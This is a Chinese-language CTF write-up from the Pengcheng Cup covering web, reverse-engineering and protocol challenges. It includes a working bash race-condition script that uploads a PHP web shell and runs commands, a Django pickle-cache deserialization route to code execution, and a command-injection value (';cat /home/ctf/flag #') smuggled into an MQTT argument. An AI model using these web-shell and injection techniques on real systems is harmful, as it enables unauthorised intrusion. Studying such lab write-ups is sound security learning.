# 鹏程杯 (我当上了全栈菜鸡？) YunSee Writeup

**来源**: ctfiot.com ID 286702
**战队**: YunSee（魔丸交流群招新广告）

## 1. WEB - web-ezphp
- 弱口令
- 抓包 cookie 解码看到 `guest`
- 修改 `admin` 0 → 1（双写都没用）
- 302 重定向到 dashboard.php
- 文件读取
- 条件竞争上传 race.php

```bash
bash -lc '
(for i in $(seq 1 20000); do
  out=$(curl -s "http://192.168.18.26:25002/tmp/race.php?cmd=id")
  echo "$out" | grep -q "uid=" && echo "$out" && break
  sleep 0.005
done) &
for i in $(seq 1 2000); do
  printf "<?php system(\$_GET['cmd']); ?>" | curl -s -H "Cookie: user_auth=..." -F "file=@-;filename=race.php" -F "upload=1" http://192.168.18.26:25002/upload.php >/dev/null
  sleep 0.02
done
wait
'
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 2. WEB - pcb5-ezDjango

### Django 文件型缓存
- 路径: `/tmp/django_cache/*.djcache`
- 序列化: `pickle + zlib`
- 文件名: `md5(key).djcache`

### 常用键的 md5 映射
```python
'pwn' -> 'e4a25f7b052442a076b02ee9a1818d2e.djcache'
':1:pwn' -> '063ac062be62bccabc8620da50bb6874.djcache'
'flag' -> '327a6c4304ad5938eaf0efb6cc3e53dc.djcache'
'env' -> 'ff035a1dd7655da15295fa5fa89362a7.djcache'
'db' -> 'd77d5e503ad1439f585ac494268b351b.djcache'
```

### 利用
- 上传 pickle payload 到 `/tmp/race.cache`
- 复制到 `md5('flag').djcache` 路径
- 触发反序列化 → RCE

## 3. REVERSE - pcb5-meddddgo

### SM4 改 key schedule
```c
MASK = [0xA5A5A5A5, 0x3C3C3C3C, 0x5A5A5A5A, 0xC3C3C3C3]
K[i] = MK[i] ^ FK[i] ^ MASK[i]
```

### 真实 key 派生
```python
def derive_key(seed):
    key = list(seed)
    for i in range(16):
        key[i] = ROL1(seed[(5*i+3) & 0xF], 1) ^ (11*i) ^ 0xA5
    # 3 轮混淆
    for r in range(3):
        for j in range(16):
            key[j] ^= (17*r + key[(j+1) & 0xF] + key[(j+5) & 0xF]) & 0xFF
    return bytes(key)
```

### flag
```
flag{12d8b17b8ae52636a1211299451f9f6c}
```

## 4. REVERSE - 30 轮 TEA-like 变种
```c
delta = 0x23251156
for round in range(30):
    sum += delta
    v += (v << 5) ^ sum ^ (v >> 4)
```

- 6 组 32-bit (24 字节)
- 与 0x42209C 常量表比对
- 反向爆破 (numpy 向量化 95^4 枚举)
- flag 用 SHA256 校验

## 5. MQTT 协议 nc 注入
- 服务端 MQTT 协议端口
- 先发 set_vin 通过校验
- 窗口期覆盖全局 arg = `合法前缀;cat /home/ctf/flag #`
- 命令注入读 flag
